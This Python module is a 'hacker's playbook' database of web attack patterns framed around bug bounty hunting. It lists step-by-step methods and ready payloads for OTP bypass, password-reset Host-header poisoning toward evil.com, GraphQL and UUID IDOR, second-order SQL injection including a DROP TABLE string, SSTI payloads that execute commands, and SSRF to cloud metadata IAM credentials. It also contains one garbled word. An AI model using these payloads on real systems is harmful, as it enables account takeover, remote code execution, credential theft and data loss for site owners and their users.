#!/usr/bin/env python3
"""
Attack Patterns - Hacker's Playbook

Real attack patterns from bug bounty experience.
Not just payloads - full attack methodologies.
"""

from dataclasses import dataclass
from typing import List, Dict, Optional
from enum import Enum


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "informational"


@dataclass
class AttackPattern:
    """A complete attack pattern, not just a payload."""
    name: str
    owasp_category: str
    severity: Severity
    description: str
    detection_method: str  # How to identify if target is vulnerable
    attack_steps: List[str]
    payloads: List[str]
    bypass_techniques: List[str]  # For WAF/filters
    indicators_of_success: List[str]
    common_mistakes: List[str]  # What defenders often get wrong
    real_world_examples: List[str]
    bounty_range: str
    

# ============================================================================
# ATTACK PATTERN DATABASE
# ============================================================================

PATTERNS = {
    
    # =========================================================================
    # AUTHENTICATION ATTACKS
    # =========================================================================
    
    "auth_bypass_otp": AttackPattern(
        name="OTP Bypass",
        owasp_category="A07:Authentication Failures",
        severity=Severity.CRITICAL,
        description="Bypass OTP/2FA by manipulating the verification flow",
        detection_method="Check if OTP verification is client-side or can be skipped",
        attack_steps=[
            "1. Start login flow, enter valid credentials",
            "2. When OTP page appears, capture the request",
            "3. Try sending empty OTP",
            "4. Try manipulating response (change 'success':false to true)",
            "5. Try accessing authenticated endpoints directly",
            "6. Check if OTP is validated on every request or just once",
            "7. Try reusing old OTPs",
            "8. Check for race conditions with multiple OTP submissions"
        ],
        payloads=[
            "",  # Empty OTP
            "000000",  # Common default
            "123456",  # Common pattern
            "null",
            "undefined",
            '{"otp":""}',  # JSON injection
        ],
        bypass_techniques=[
            "Manipulate response in Burp",
            "Direct endpoint access",
            "Session fixation before OTP",
            "Race condition"
        ],
        indicators_of_success=[
            "Access to authenticated content",
            "Session cookie issued without OTP",
            "Different response length"
        ],
        common_mistakes=[
            "Client-side OTP validation",
            "Not invalidating OTP after use",
            "No rate limiting on OTP attempts",
            "OTP in response body"
        ],
        real_world_examples=[
            "Instagram 2FA bypass",
            "PayPal OTP race condition"
        ],
        bounty_range="$1,000 - $20,000"
    ),
    
    "auth_password_reset_poisoning": AttackPattern(
        name="Password Reset Token Poisoning",
        owasp_category="A07:Authentication Failures",
        severity=Severity.HIGH,
        description="Manipulate password reset flow to steal reset tokens",
        detection_method="Check Host header handling in password reset emails",
        attack_steps=[
            "1. Go to 'Forgot Password' page",
            "2. Enter victim's email",
            "3. Intercept the request",
            "4. Add/modify Host header to attacker-controlled domain",
            "5. Check if reset link uses attacker's domain",
            "6. Try X-Forwarded-Host header",
            "7. Try injecting into email parameter: victim@example.com, attacker@evil.com"
        ],
        payloads=[
            "Host: evil.com",
            "Host: target.com\r\nX-Forwarded-Host: evil.com",
            "Host: target.com:@evil.com",
            "Host: target.com#@evil.com",
        ],
        bypass_techniques=[
            "Use X-Forwarded-Host",
            "Use X-Host",
            "Dangling markup injection",
            "Add port number"
        ],
        indicators_of_success=[
            "Reset link contains attacker domain",
            "Email sent with manipulated link"
        ],
        common_mistakes=[
            "Using Host header in reset URLs",
            "Not validating email format properly",
            "Token in URL without additional validation"
        ],
        real_world_examples=[
            "Django Host header injection",
            "Multiple SaaS password reset bugs"
        ],
        bounty_range="$500 - $5,000"
    ),
    
    # =========================================================================
    # IDOR / ACCESS CONTROL
    # =========================================================================
    
    "idor_uuid": AttackPattern(
        name="IDOR with UUID/GUID",
        owasp_category="A01:Broken Access Control",
        severity=Severity.HIGH,
        description="Exploit IDOR even when UUIDs are used",
        detection_method="Find ways to leak or predict UUIDs",
        attack_steps=[
            "1. Look for UUID leakage in responses, URLs, JS files",
            "2. Check if UUIDs are sequential or time-based (UUIDv1)",
            "3. Search for UUID in page source, comments, API responses",
            "4. Check public profiles/pages for UUID exposure",
            "5. Try GUID mutation (change last character)",
            "6. Check for UUID in error messages",
            "7. Look for alternative identifiers (email, username)",
            "8. Check for mass assignment to override UUID"
        ],
        payloads=[
            "UUID from public profile",
            "UUID from email notification",
            "UUID from shared link",
            "UUID from GraphQL introspection",
        ],
        bypass_techniques=[
            "UUID version Agentlysis",
            "Leak from other endpoints",
            "Google dorking: site:target.com inurl:uuid",
            "Wayback machine for old UUIDs"
        ],
        indicators_of_success=[
            "Access to other user's data",
            "Can perform actions as other user"
        ],
        common_mistakes=[
            "Assuming UUIDs are unguessable",
            "Leaking UUIDs in public contexts",
            "Not checking ownership after UUID validation"
        ],
        real_world_examples=[
            "Facebook photo album IDOR",
            "Uber trip IDOR"
        ],
        bounty_range="$500 - $10,000"
    ),
    
    "idor_graphql": AttackPattern(
        name="GraphQL IDOR",
        owasp_category="A01:Broken Access Control",
        severity=Severity.HIGH,
        description="Exploit GraphQL to access unauthorized data",
        detection_method="Check GraphQL introspection and mutation/query patterns",
        attack_steps=[
            "1. Enable introspection query to get schema",
            "2. Identify queries that return user/sensitive data",
            "3. Look for ID parameters in queries",
            "4. Try changing ID to access other records",
            "5. Check nested queries for IDOR",
            "6. Try batch queries to enumerate IDs",
            "7. Look for mutations that don't check ownership",
            "8. Check @deprecated fields for information disclosure"
        ],
        payloads=[
            '{"query":"{__schema{types{name fields{name}}}}"}',
            '{"query":"query{user(id:VICTIM_ID){email,password_hash}}"}',
            '{"query":"query{users{id,email,role}}"}',  # List all users
        ],
        bypass_techniques=[
            "Alias queries to bypass rate limits",
            "Nested queries for data aggregation",
            "Batched queries",
            "Fragments for complex extractions"
        ],
        indicators_of_success=[
            "Return data for other users",
            "Admin-only fields accessible",
            "Private information leaked"
        ],
        common_mistakes=[
            "Introspection enabled in production",
            "No authorization in resolvers",
            "Trusting client-provided IDs"
        ],
        real_world_examples=[
            "GitLab GraphQL IDOR",
            "Shopify GraphQL bugs"
        ],
        bounty_range="$1,000 - $15,000"
    ),
    
    # =========================================================================
    # INJECTION
    # =========================================================================
    
    "sqli_second_order": AttackPattern(
        name="Second-Order SQL Injection",
        owasp_category="A03:Injection",
        severity=Severity.CRITICAL,
        description="SQL injection where payload is stored and triggered later",
        detection_method="Insert payload, trigger execution in another context",
        attack_steps=[
            "1. Identify where input is stored (registration, profile update)",
            "2. Inject payload that won't execute immediately",
            "3. Find where stored data is used in queries (reports, exports, search)",
            "4. Trigger the second context",
            "5. Check for time-based blind indicators",
            "6. Often found in: usernames, addresses, comments",
            "7. Check admin panels that display user data"
        ],
        payloads=[
            "admin'--",
            "admin'/*",
            "' OR '1'='1",
            "'; WAITFOR DELAY '0:0:5'--",
            "test'); DROP TABLE users;--",
        ],
        bypass_techniques=[
            "Use hex encoding",
            "Fragmented payload across fields",
            "Time-based detection",
            "Out-of-band via DNS"
        ],
        indicators_of_success=[
            "Delayed execution in reports",
            "Error when admin views data",
            "Time delay in batch processes"
        ],
        common_mistakes=[
            "Only sanitizing on input, not output",
            "Trusting data from database",
            "Different escaping in different contexts"
        ],
        real_world_examples=[
            "WordPress stored XSS/SQLi",
            "CMS admin panel injections"
        ],
        bounty_range="$2,000 - $30,000"
    ),
    
    "ssti": AttackPattern(
        name="Server-Side Template Injection",
        owasp_category="A03:Injection",
        severity=Severity.CRITICAL,
        description="Inject into server-side templates to achieve RCE",
        detection_method="Test mathematical expressions in template contexts",
        attack_steps=[
            "1. Find where input is reflected in response",
            "2. Try {{7*7}} - if 49 appears, SSTI likely",
            "3. Identify template engine (Jinja2, Twig, Freemarker)",
            "4. Craft RCE payload for specific engine",
            "5. Common contexts: error pages, email templates, PDF generators",
            "6. Check custom 404 pages",
            "7. Look for template syntax in URLs"
        ],
        payloads=[
            "{{7*7}}",  # Generic test
            "${7*7}",  # Java EL
            "{{config}}",  # Jinja2 config leak
            "{{''.__class__.__mro__[2].__subclasses__()}}",  # Jinja2 RCE
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",  # Twig
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",  # Freemarker
        ],
        bypass_techniques=[
            "Unicode encoding",
            "String concatenation",
            "Attribute access variations",
            "Use of filters"
        ],
        indicators_of_success=[
            "Mathematical result appears",
            "Config/environment leaked",
            "Command output in response"
        ],
        common_mistakes=[
            "Using user input in template strings",
            "Not sandboxing template engine",
            "Trusting 'safe' inputs"
        ],
        real_world_examples=[
            "Uber Jinja2 SSTI",
            "Shopify Liquid SSTI"
        ],
        bounty_range="$5,000 - $50,000"
    ),
    
    # =========================================================================
    # SSRF
    # =========================================================================
    
    "ssrf_cloud_metadata": AttackPattern(
        name="SSRF to Cloud Metadata",
        owasp_category="A10:SSRF",
        severity=Severity.CRITICAL,
        description="Exploit SSRF to access cloud provider metadata endpoints",
        detection_method="Find URL fetch functionality and test internal IPs",
        attack_steps=[
            "1. Find features that fetch URLs (webhooks, image import, link preview)",
            "2. Test with collaborator/webhook.site to confirm fetch",
            "3. Try cloud metadata endpoints",
            "4. AWS: http://169.254.169.254/latest/meta-data/",
            "5. GCP: http://metadata.google.internal/",
            "6. Azure: http://169.254.169.254/metadata/",
            "7. Extract credentials from metadata",
            "8. Pivot to internal services"
        ],
        payloads=[
            # AWS
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            # GCP
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/computeMetadata/v1/?recursive=true",
            # Azure
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            # DigitalOcean
            "http://169.254.169.254/metadata/v1/",
            # Kubernetes
            "https://kubernetes.default.svc/",
        ],
        bypass_techniques=[
            "DNS rebinding",
            "Redirect chain",
            "URL encoding",
            "IPv6 representation",
            "Decimal IP (2852039166 = 169.254.169.254)",
            "Octal IP",
            "URL shorteners"
        ],
        indicators_of_success=[
            "Cloud metadata returned",
            "IAM credentials exposed",
            "Internal service information"
        ],
        common_mistakes=[
            "Blacklisting instead of whitelisting",
            "Not following redirects in validation",
            "Only checking first request"
        ],
        real_world_examples=[
            "Capital One breach (SSRF to AWS creds)",
            "GitLab Kubernetes SSRF"
        ],
        bounty_range="$5,000 - $100,000"
    ),
    
    # =========================================================================
    # BUSINESS LOGIC
    # =========================================================================
    
    "race_condition": AttackPattern(
        name="Race Condition",
        owasp_category="A04:Insecure Design",
        severity=Severity.HIGH,
        description="Exploit timing vulnerabilities in multi-step processes",
        detection_method="Send parallel requests to same endpoint",
        attack_steps=[
            "1. Identify multi-step processes (checkout, transfer, redeem)",
            "2. Identify the critical moment (balance check, inventory check)",
            "3. Prepare multiple identical requests",
            "4. Send simultaneously using Turbo Intruder or race condition tools",
            "5. Check if action completed multiple times",
            "6. Common in: coupon redemption, balance transfers, voting",
            "7. Look for TOCTOU (Time of Check to Time of Use) gaps"
        ],
        payloads=[
            "Turbo Intruder: race condition single-packet attack",
            "20+ simultaneous requests",
            "HTTP/2 single connection multiplexing"
        ],
        bypass_techniques=[
            "HTTP/2 for better timing",
            "Parallel connections",
            "Request smuggling to sync",
            "Last-byte sync technique"
        ],
        indicators_of_success=[
            "Coupon applied multiple times",
            "Balance decreased once, action performed twice",
            "Inventory oversold"
        ],
        common_mistakes=[
            "Checking and acting in separate queries",
            "No database transactions",
            "Optimistic locking without retry limits"
        ],
        real_world_examples=[
            "Starbucks gift card race condition",
            "Trading platform duplicate withdrawals"
        ],
        bounty_range="$2,000 - $20,000"
    ),
}


def get_pattern(name: str) -> Optional[AttackPattern]:
    """Get attack pattern by name."""
    return PATTERNS.get(name)


def get_patterns_by_severity(severity: Severity) -> List[AttackPattern]:
    """Get all patterns of a given severity."""
    return [p for p in PATTERNS.values() if p.severity == severity]


def get_patterns_by_category(owasp_category: str) -> List[AttackPattern]:
    """Get all patterns for an OWASP category."""
    return [p for p in PATTERNS.values() if owasp_category in p.owasp_category]


def search_patterns(keyword: str) -> List[AttackPattern]:
    """Search patterns by keyword."""
    keyword = keyword.lower()
    results = []
    for p in PATTERNS.values():
        if (keyword in p.name.lower() or 
            keyword in p.description.lower() or
            keyword in str(p.attack_steps).lower()):
            results.append(p)
    return results


if __name__ == "__main__":
    print("Attack Patterns Database")
    print("=" * 60)
    print(f"Total patterns: {len(PATTERNS)}")
    print("\nPatterns by severity:")
    for sev in Severity:
        count = len(get_patterns_by_severity(sev))
        print(f"  {sev.value}: {count}")

